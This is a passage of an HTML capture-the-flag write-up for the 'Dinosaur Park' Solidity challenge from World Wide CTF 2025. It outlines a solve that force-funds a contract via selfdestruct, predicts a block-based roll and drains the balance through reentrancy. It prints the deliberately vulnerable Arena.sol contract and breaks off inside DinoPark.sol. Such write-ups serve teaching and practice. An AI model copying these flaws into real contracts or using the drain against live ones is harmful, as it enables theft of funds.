@@ -1,0 +1,1403 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+
+  
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="We bouta knock that raptor down, on godzilla">  
+
+
+  
+  <meta property="og:type" content="website">
+  <meta property="og:description" content="We bouta knock that raptor down, on godzilla" />
+  <meta property="og:image" content="https://wepfen.github.io/images/writeups/wwctf/backstabbing-reentrancy.png" />
+  <meta property="og:url" content="https://wepfen.github.io/writeups/wwctf-dinopark/">
+  <meta property="og:title" content="World Wide CTF 2025 - Dinosaur Park [blockchain]">
+  <meta property="og:site_name" content="wepfen.github.io">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta property="twitter:domain" content="wepfen.github.io">
+  <meta property="twitter:url" content="https://wepfen.github.io/writeups/wwctf-dinopark/">
+  <meta name="twitter:title" content="World Wide CTF 2025 - Dinosaur Park [blockchain]">
+  <meta name="twitter:description" content="We bouta knock that raptor down, on godzilla">
+  <meta name="twitter:image" content="https://wepfen.github.io/images/writeups/wwctf/backstabbing-reentrancy.png">
+  
+  <title>
+    
+      World Wide CTF 2025 - Dinosaur Park [blockchain]
+    
+  </title>
+
+
+  <link rel="icon" type="image/gif" href="/images/oia-uia.gif" />
+   
+
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.9bb372a616563f9ecafd6e5ea0d7760c487f35e7358f212b258b477fbfa75f5264ef33aaffa0334383ffc444b631b8dc5c496c67b5830ab2ac1f1e226a1125c3.css" integrity="sha512-m7NyphZWP57K/W5eoNd2DEh/Nec1jyErJYtHf7&#43;nX1Jk7zOq/6AzQ4P/xES2MbjcXElsZ7WDCrKsHx4iahElww==" />
+
+  
+
+
+</head>
+
+    <body a="dark">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">~/</a>
+
+
+
+
+<script src="/js/theme-toggle.f10bb0c6283b259e63664053a20ccc48c8b0980e44bceece1c10401c529c2040.js" integrity="sha256-8Quwxig7JZ5jZkBTogzMSMiwmA5EvO7OHBBAHFKcIEA="></script>
+
+<button style="float: right; background: none; outline: none;" onclick="toggleTheme()">
+
+<svg class="w-6 h-6 text-gray-800 dark:text-white theme" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
+  <path fill-rule="evenodd" d="M7.05 4.05A7 7 0 0 1 19 9c0 2.407-1.197 3.874-2.186 5.084l-.04.048C15.77 15.362 15 16.34 15 18a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1c0-1.612-.77-2.613-1.78-3.875l-.045-.056C6.193 12.842 5 11.352 5 9a7 7 0 0 1 2.05-4.95ZM9 21a1 1 0 0 1 1-1h4a1 1 0 1 1 0 2h-4a1 1 0 0 1-1-1Zm1.586-13.414A2 2 0 0 1 12 7a1 1 0 1 0 0-2 4 4 0 0 0-4 4 1 1 0 0 0 2 0 2 2 0 0 1 .586-1.414Z" clip-rule="evenodd"/>
+</svg>
+
+</button>
+
+
+
+
+
+
+<article>
+    <p class="post-meta">
+        <time datetime="2025-08-02 02:04:15 &#43;0200 CEST">
+            2025-08-02
+        </time>
+    </p>
+
+    <h1>World Wide CTF 2025 - Dinosaur Park [blockchain]</h1>
+
+    
+        <aside >
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#tldr">TL;DR</a></li>
+    <li><a href="#video-writeup">Video writeup</a></li>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#reading-the-code">Reading the code</a>
+      <ul>
+        <li><a href="#dinopark">DinoPark</a>
+          <ul>
+            <li><a href="#issolved">isSolved</a></li>
+            <li><a href="#goldeneggholder">goldenEggHolder</a></li>
+            <li><a href="#claimgoldenegg">claimGoldenEgg</a></li>
+          </ul>
+        </li>
+        <li><a href="#arena">Arena</a>
+          <ul>
+            <li><a href="#ischampion">isChampion</a></li>
+            <li><a href="#_didplayerwin">_didPlayerWin</a></li>
+            <li><a href="#preparearena">prepareArena</a></li>
+            <li><a href="#how-to-solve-in-a-nutshell">How to solve in a nutshell</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#solve">Solve</a>
+      <ul>
+        <li><a href="#fund-arena">Fund arena</a></li>
+        <li><a href="#win-the-fight-and-have-a-correct-guess">Win the fight and have a correct guess</a></li>
+        <li><a href="#empty-the-arena-contract">Empty the arena contract</a></li>
+        <li><a href="#get-the-flag">Get the flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+        </aside>
+    
+
+    <blockquote>
+<p>Difficulty : Easy</p>
+</blockquote>
+<blockquote>
+<p>Team : Phreaks 2600</p>
+</blockquote>
+<blockquote>
+<p>Description : Are you brave enough to face the raptor and claim the legendary golden egg?</p>
+</blockquote>
+<blockquote>
+<p>Author : zeptoide</p>
+</blockquote>
+<blockquote>
+<p>Topics : solidity, reentrancy, selfdestruct, foundry, scripting</p>
+</blockquote>
+<h1 id="tldr">TL;DR</h1>
+<ul>
+<li>force the transfer funds to arena with selfdestruct</li>
+<li>guess the correct number and become win the fight</li>
+<li>empty the arena balance with a reentrancy</li>
+<li>claim the golden egg</li>
+<li>claim the flag</li>
+</ul>
+<hr>
+<h1 id="video-writeup">Video writeup</h1>
+<div style="text-align: center">
+<video controls >
+  <source src="../../videos/wwctf-dinosaurpark.mp4" type="video/mp4">
+Your browser does not support the video tag.
+</video>
+</div>
+<hr>
+<h1 id="introduction">Introduction</h1>
+<p>So we got a blockchain challenge with solidity smart contracts. One, <code>DinoPark</code> is used as the contract to check for the solve with <code>isSolve()</code> function and also deploy another useful contract : <code>Arena</code> where the real things happen.</p>
+<p><details>
+  <summary style="color: #F99417; cursor: pointer">Arena.sol</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">57
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">58
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">59
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">60
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">61
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">62
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">63
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">64
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">65
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">66
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">67
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">68
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">69
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">70
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">71
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">72
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">73
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">74
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#859289;font-style:italic">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span><span style="color:#e67e80">pragma solidity</span> <span style="color:#7a8478">^</span><span style="color:#d699b6">0</span>.<span style="color:#d699b6">8</span>.<span style="color:#d699b6">19</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> Arena {
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">address</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">immutable</span> parkContract;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> PRIZE_MONEY <span style="color:#7a8478">=</span> <span style="color:#d699b6">0</span>.<span style="color:#d699b6">1</span> <span style="color:#e67e80">ether</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> PLAYER_STRENGTH <span style="color:#7a8478">=</span> <span style="color:#d699b6">470</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> <span style="color:#e67e80">public</span> parkRaptorStrength <span style="color:#7a8478">=</span> <span style="color:#d699b6">500</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">enum</span> FightMode { Normal, Ranked }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">mapping</span>(<span style="color:#dbbc7f">address</span> <span style="color:#7a8478">=&gt;</span> <span style="color:#dbbc7f">bool</span>) <span style="color:#e67e80">public</span> isFighting;
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">mapping</span>(<span style="color:#dbbc7f">address</span> <span style="color:#7a8478">=&gt;</span> <span style="color:#dbbc7f">bool</span>) <span style="color:#e67e80">public</span> champions;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">event</span> rollPicked(<span style="color:#dbbc7f">uint8</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">address</span> _park) <span style="color:#e67e80">payable</span> {
+</span></span><span style="display:flex;"><span>        parkContract <span style="color:#7a8478">=</span> _park;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">prepareArena</span>() <span style="color:#e67e80">internal</span> <span style="color:#e67e80">view</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> currentBalance <span style="color:#7a8478">=</span> <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>).<span style="color:#d699b6">balance</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(currentBalance <span style="color:#7a8478">&gt;=</span> <span style="color:#d699b6">0</span>.<span style="color:#d699b6">2</span> <span style="color:#e67e80">ether</span>, <span style="color:#b2c98f">&#34;Capital Audit: Stage 1 Failed.&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(currentBalance <span style="color:#7a8478">&gt;=</span> <span style="color:#d699b6">0</span>.<span style="color:#d699b6">4</span> <span style="color:#e67e80">ether</span>, <span style="color:#b2c98f">&#34;Capital Audit: Stage 2 Failed.&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(currentBalance <span style="color:#7a8478">&gt;=</span> <span style="color:#d699b6">0</span>.<span style="color:#d699b6">6</span> <span style="color:#e67e80">ether</span>, <span style="color:#b2c98f">&#34;Capital Audit: Stage 3 Failed.&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">triggerMeteorShower</span>() <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span> <span style="color:#7a8478">==</span> parkContract, <span style="color:#b2c98f">&#34;Only the park can trigger events! ;)&#34;</span>);
+</span></span><span style="display:flex;"><span>        parkRaptorStrength <span style="color:#7a8478">+=</span> <span style="color:#d699b6">200</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">fight</span>(<span style="color:#dbbc7f">uint8</span> guess, FightMode mode) <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">if</span> (<span style="color:#7a8478">!</span>isFighting[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>]) {
+</span></span><span style="display:flex;"><span>            prepareArena();
+</span></span><span style="display:flex;"><span>            isFighting[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">=</span> <span style="color:#e67e80">true</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">bool</span> playerWins <span style="color:#7a8478">=</span> _didPlayerWin(guess, mode);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">if</span> (playerWins) {
+</span></span><span style="display:flex;"><span>            champions[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">=</span> <span style="color:#e67e80">true</span>;
+</span></span><span style="display:flex;"><span>            (<span style="color:#dbbc7f">bool</span> sent, ) <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>.<span style="color:#d699b6">call</span>{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> PRIZE_MONEY}(<span style="color:#b2c98f">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#d699b6">require</span>(sent, <span style="color:#b2c98f">&#34;Arena: Failed to send prize&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        isFighting[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">=</span> <span style="color:#e67e80">false</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">_didPlayerWin</span>(<span style="color:#dbbc7f">uint8</span> guess, FightMode mode) <span style="color:#e67e80">internal</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> raptor <span style="color:#7a8478">=</span> parkRaptorStrength;
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">if</span> (mode <span style="color:#7a8478">==</span> FightMode.Ranked) {
+</span></span><span style="display:flex;"><span>            raptor <span style="color:#7a8478">+=</span> <span style="color:#d699b6">100</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint8</span> roll <span style="color:#7a8478">=</span> <span style="color:#dbbc7f">uint8</span>(<span style="color:#dbbc7f">uint256</span>(<span style="color:#d699b6">keccak256</span>(<span style="color:#d699b6">abi</span>.<span style="color:#d699b6">encodePacked</span>(<span style="color:#d699b6">block</span>.<span style="color:#d699b6">timestamp</span>, <span style="color:#d699b6">block</span>.prevrandao))) <span style="color:#7a8478">%</span> <span style="color:#d699b6">100</span>);
+</span></span><span style="display:flex;"><span>        emit rollPicked(roll);
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> totalPlayer <span style="color:#7a8478">=</span> PLAYER_STRENGTH <span style="color:#7a8478">+</span> roll;
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> (guess <span style="color:#7a8478">==</span> roll) <span style="color:#7a8478">&amp;&amp;</span> (totalPlayer <span style="color:#7a8478">&gt;</span> raptor);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">isChampion</span>(<span style="color:#dbbc7f">address</span> _player) <span style="color:#e67e80">external</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> champions[_player];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">drainToChampion</span>(<span style="color:#dbbc7f">address</span> champ) <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span> <span style="color:#7a8478">==</span> parkContract, <span style="color:#b2c98f">&#34;Only DinoPark can drain&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> bal <span style="color:#7a8478">=</span> <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>).<span style="color:#d699b6">balance</span>;
+</span></span><span style="display:flex;"><span>        (<span style="color:#dbbc7f">bool</span> ok, ) <span style="color:#7a8478">=</span> champ.<span style="color:#d699b6">call</span>{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> bal}(<span style="color:#b2c98f">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(ok, <span style="color:#b2c98f">&#34;Drain failed&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<br></p>
+<details>
+  <summary style="color: #F99417; cursor: pointer">DinoPark.sol</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
